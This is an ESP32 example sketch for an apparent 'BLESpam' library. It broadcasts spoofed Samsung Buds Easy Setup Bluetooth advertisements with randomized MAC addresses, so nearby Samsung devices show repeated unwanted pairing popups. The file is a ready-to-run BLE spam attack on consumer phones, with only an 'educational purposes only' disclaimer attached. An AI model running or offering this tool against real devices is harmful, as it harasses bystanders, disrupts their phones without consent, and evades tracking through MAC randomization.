/**
 * SamsungEasySetup Example
 * 
 * This example demonstrates how to use the BLESpam library to create
 * Samsung Easy Setup popups on nearby Samsung devices.
 * 
 * Compatible with ESP32 boards
 * 
 * DISCLAIMER: This is for educational purposes only. Use responsibly.
 */

#include <BLESpam.h>

BLESpam bleSpam;

void setup() {
    Serial.begin(115200);
    Serial.println("BLESpam - Samsung Easy Setup Example");
    Serial.println("====================================");
    
    // Initialize the BLE spam library
    if (!bleSpam.begin("ESP32-Samsung")) {
        Serial.println("Failed to initialize BLE!");
        while(1) delay(1000);
    }
    
    Serial.println("BLE initialized successfully!");
    
    // Configure advertising parameters
    bleSpam.setAdvertisingInterval(100); // 100ms interval
    bleSpam.setTxPower(3);               // 3 dBm power
    bleSpam.setRandomMac(true);          // Use random MAC address
    
    Serial.println("Starting Samsung Easy Setup advertisements...");
    
    // Start advertising
    bleSpam.advertiseSamsungEasySetup("Buds");
}

void loop() {
    // Just keep advertising
    Serial.println("Advertising Samsung Easy Setup...");
    delay(5000);
}
